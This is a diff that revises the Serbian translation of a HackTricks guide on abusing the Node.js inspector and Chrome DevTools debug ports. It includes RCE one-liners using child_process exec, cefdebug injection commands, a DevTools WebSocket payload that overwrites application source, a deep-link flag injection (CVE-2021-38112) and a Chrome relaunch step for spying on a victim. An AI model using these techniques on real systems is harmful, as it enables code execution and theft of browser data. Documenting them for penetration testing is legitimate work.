@@ -1,27 +1,28 @@
-# Zloupotreba Node inspektora/CEF debugovanja
+# Node inspector/CEF debug abuse
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Osnovne informacije
+## Basic Information
 
-[Od dokumentacije](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Kada se pokrene sa `--inspect` prekidačem, Node.js proces osluškuje za debug klijenta. Podrazumevano, osluškuje na hostu i portu **`127.0.0.1:9229`**. Svaki proces takođe dobija **jedinstveni** **UUID**.
+[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Kada se pokrene sa `--inspect` preklopnikom, Node.js proces sluša za klijentom za debagovanje. Po **defaultu**, sluša na adresi i portu **`127.0.0.1:9229`**. Svakom procesu je takođe dodeljen **jedinstveni** **UUID**.
 
-Inspektor klijenti moraju znati i specificirati adresu hosta, port i UUID za povezivanje. Ceo URL će izgledati nešto kao `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+Klijenti inspektora moraju znati i odrediti adresu hosta, port i UUID za povezivanje. Puna URL adresa će izgledati otprilike kao `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
 
 {% hint style="warning" %}
-Pošto **debuger ima pun pristup Node.js izvršnom okruženju**, zlonamerni akter koji može da se poveže na ovaj port može izvršiti proizvoljan kod u ime Node.js procesa (**potencijalno eskalacija privilegija**).
+Pošto **debugger ima pun pristup Node.js okruženju za izvršavanje**, zlonamerna osoba koja može da se poveže na ovaj port može biti u mogućnosti da izvrši proizvoljan kod u ime Node.js procesa (**potencijalna eskalacija privilegija**).
 {% endhint %}
 
 Postoji nekoliko načina za pokretanje inspektora:
@@ -35,50 +36,50 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-Kada pokrenete proces koji se inspicira, pojaviće se nešto slično ovome:
+Kada pokrenete inspekcijski proces, nešto poput ovoga će se pojaviti:
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) poput potrebe da koriste parametar: `--remote-debugging-port=9222` da bi otvorili **debugger** (zaštite od SSRF ostaju vrlo slične). Međutim, umesto dodeljivanja **NodeJS** **debug** sesije, oni će komunicirati sa pregledačem koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ovo je interfejs za kontrolu pregledača, ali nema direktnog RCE.
+Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) treba da koriste parametar: `--remote-debugging-port=9222` da bi otvorili **debugger** (zaštite od SSRF ostaju veoma slične). Međutim, oni **umesto** davanja **NodeJS** **debug** sesije će komunicirati sa pregledačem koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ovo je interfejs za kontrolu pregledača, ali ne postoji direktan RCE.
 
-Kada pokrenete pregledač u režimu za debagovanje, nešto slično ovome će se pojaviti:
+Kada pokrenete debagovani pregledač, nešto poput ovoga će se pojaviti:
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
-### Preglednici, WebSockets i politika istog porekla <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
+### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-Veb-sajtovi otvoreni u veb-pregledaču mogu da vrše WebSocket i HTTP zahteve u okviru bezbednosnog modela pregledača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije za debager**. **Politika istog porekla** **sprečava** veb-sajtove da mogu da naprave **ovu HTTP vezu**. Radi dodatne bezbednosti protiv [**DNS preusmeravanja napada**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** za vezu precizno navode **IP adresu** ili **`localhost`** ili **`localhost6`**.
+Veb-sajtovi otvoreni u veb-pretraživaču mogu da prave WebSocket i HTTP zahteve pod modelom bezbednosti pretraživača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije debagera**. **Politika iste porekla** **sprečava** veb-sajtove da mogu da naprave **ovu HTTP vezu**. Za dodatnu bezbednost protiv [**DNS rebinding napada**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** za vezu ili specificiraju **IP adresu** ili **`localhost`** ili **`localhost6`** tačno.
 
 {% hint style="info" %}
-Ove **bezbednosne mere sprečavaju iskorišćavanje inspektora** za izvršavanje koda samo slanjem HTTP zahteva (što bi se moglo uraditi iskorišćavanjem SSRF ranjivosti).
+Ove **bezbednosne mere sprečavaju korišćenje inspektora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo biti učinjeno iskorišćavanjem SSRF ranjivosti).
 {% endhint %}
 
-### Pokretanje inspektora u pokrenutim procesima
+### Starting inspector in running processes
 
-Možete poslati **signal SIGUSR1** pokrenutom nodejs procesu da bi se **pokrenuo inspektor** na podrazumevanom portu. Međutim, imajte na umu da je potrebno imati dovoljno privilegija, pa ovo može omogućiti pristup **privilegovanim informacijama unutar procesa** ali ne i direktnu eskalaciju privilegija.
+Možete poslati **signal SIGUSR1** pokrenutom nodejs procesu da bi **pokrenuo inspektora** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljno privilegija, tako da ovo može omogućiti **privilegovan pristup informacijama unutar procesa** ali ne i direktnu eskalaciju privilegija.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 {% hint style="info" %}
-Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa `--inspect` nije **opcija** jer će **kontejner** biti **ubijen** sa procesom.
+Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa `--inspect` **nije opcija** jer će **kontejner** biti **ubijen** zajedno sa procesom.
 {% endhint %}
 
-### Povezivanje sa inspektorom/debugerom
+### Povezivanje sa inspektorom/debuggerom
 
-Da biste se povezali sa **Chromium-based browserom**, možete pristupiti URL-ovima `chrome://inspect` ili `edge://inspect` za Chrome odnosno Edge. Klikom na dugme Configure, treba se osigurati da su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):
+Da biste se povezali sa **pregledačem zasnovanim na Chromium-u**, možete pristupiti URL-ovima `chrome://inspect` ili `edge://inspect` za Chrome ili Edge, respektivno. Klikom na dugme Konfiguriši, treba osigurati da su **ciljni host i port** ispravno navedeni. Slika prikazuje primer daljinskog izvršavanja koda (RCE):
 
 ![](<../../.gitbook/assets/image (674).png>)
 
-Korišćenjem **komandne linije** možete se povezati sa debuggerom/inspektorom pomoću:
+Korišćenjem **komandne linije** možete se povezati sa debuggerom/inspektorom sa:
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-Alatka [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), omogućava **pronalaženje inspektora** koji se izvršavaju lokalno i **ubacivanje koda** u njih.
+Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalazak inspektora** koji se izvode lokalno i **ubacivanje koda** u njih.
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -88,16 +89,16 @@ Alatka [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdeb
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-Imajte na umu da **NodeJS RCE eksploatacije neće raditi** ako ste povezani sa pregledačem putem [**Chrome DevTools Protocola**](https://chromedevtools.github.io/devtools-protocol/) (treba da proverite API da biste pronašli zanimljive stvari koje možete s njim uraditi).
+Napomena: **NodeJS RCE eksploatiacije neće raditi** ako je povezan sa pregledačem putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (trebalo bi da proverite API da biste pronašli zanimljive stvari koje možete raditi sa njim).
 {% endhint %}
 
-## RCE u NodeJS Debugger/Inspector-u
+## RCE u NodeJS Debuggeru/Inspektoru
 
 {% hint style="info" %}
-Ako ste ovde došli tražeći kako da dobijete **RCE putem XSS u Electronu, molimo proverite ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
+Ako ste došli ovde tražeći kako da dobijete [**RCE iz XSS u Electron, molimo proverite ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 {% endhint %}
 
-Neke uobičajene metode za dobijanje **RCE** kada možete **povezati** se na Node **inspektor** su korišćenje nečega poput (izgleda da ovo **neće raditi u vezi sa Chrome DevTools protokolom**):
+Neki uobičajeni načini za dobijanje **RCE** kada možete **povezati** sa Node **inspektorom** su korišćenje nečega poput (izgleda da ovo **neće raditi u vezi sa Chrome DevTools protokolom**):
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -107,21 +108,23 @@ Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
 ## Chrome DevTools Protocol Payloads
 
 Možete proveriti API ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-U odeljku ću samo navesti zanimljive stvari koje sam pronašao da su ljudi koristili za iskorišćavanje ovog protokola.
+U ovom odeljku ću samo navesti zanimljive stvari koje sam primetio da su ljudi koristili za eksploataciju ovog protokola.
 
-### Ubacivanje parametara putem dubokih veza
+### Parameter Injection via Deep Links
 
-U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security je otkrio da je aplikacija zasnovana na CEF **registrovala prilagođeni URI** u sistemu (workspaces://) koji je primao puni URI, a zatim **pokretao CEF zasnovanu aplikaciju** sa konfiguracijom koja je delimično konstruisana iz tog URI-ja.
+U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security je otkrio da je aplikacija zasnovana na CEF **registrovala prilagođeni UR**I u sistemu (workspaces://) koji je primao puni URI i zatim **pokretao CEF zasnovanu aplikaciju** sa konfiguracijom koja je delimično konstruisana iz tog URI-ja.
 
-Otkriveno je da su parametri URI-ja dekodirani URL-om i korišćeni za pokretanje osnovne CEF aplikacije, omogućavajući korisniku da **ubaci** zastavicu **`--gpu-launcher`** u **komandnoj liniji** i izvrši proizvoljne radnje.
+Otkriveno je da su URI parametri bili URL dekodirani i korišćeni za pokretanje CEF osnovne aplikacije, omogućavajući korisniku da **ubaci** flag **`--gpu-launcher`** u **komandnu liniju** i izvrši proizvoljne stvari.
 
-Dakle, payload poput:
+Dakle, payload kao:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
-### Prepisivanje fajlova
+Will execute a calc.exe.
 
-Promenite folder gde će **preuzeti fajlovi biti sačuvani** i preuzmite fajl da **prepiset** često korišćeni **izvorni kod** aplikacije sa vašim **zlonamernim kodom**.
+### Overwrite Files
+
+Promenite fasciklu u kojoj će **preuzeti fajlovi biti sačuvani** i preuzmite fajl da **prepišete** često korišćeni **izvorni kod** aplikacije sa vašim **malicioznim kodom**.
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -133,19 +136,19 @@ downloadPath: '/code/'
 }
 }));
 ```
-### Webdriver RCE i ekstrakcija podataka
+### Webdriver RCE i eksfiltracija
 
-Prema ovom postu: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) moguće je dobiti RCE i ekstraktovati interne stranice iz therivera.
+Prema ovom postu: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) moguće je dobiti RCE i eksfiltrirati interne stranice iz theriver.
 
-### Post-Eksploatacija
+### Post-eksploatacija
 
-U stvarnom okruženju i **nakon kompromitovanja** korisnikovog računara koji koristi Chrome/Chromium bazirani pregledač, mogli biste pokrenuti Chrome proces sa **aktiviranim debagovanjem i proslediti port za debagovanje** kako biste mu pristupili. Na ovaj način ćete moći **inspekcijom pratiti sve što žrtva radi sa Chrome-om i ukrasti osetljive informacije**.
+U pravom okruženju i **nakon kompromitovanja** korisničkog računara koji koristi Chrome/Chromium baziran pretraživač, mogli biste pokrenuti Chrome proces sa **aktiviranim debagovanjem i preusmeriti debag port** kako biste mu pristupili. Na ovaj način ćete moći da **inspektujete sve što žrtva radi sa Chrome-om i ukradete osetljive informacije**.
 
-Neprimetan način je **završiti svaki Chrome proces** a zatim pozvati nešto poput
+Tajni način je da **prekinete svaki Chrome proces** i zatim pozovete nešto poput
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
-## Reference
+## References
 
 * [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
 * [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
@@ -158,16 +161,17 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 * [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
 * [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
 
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ČLANSTVO**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
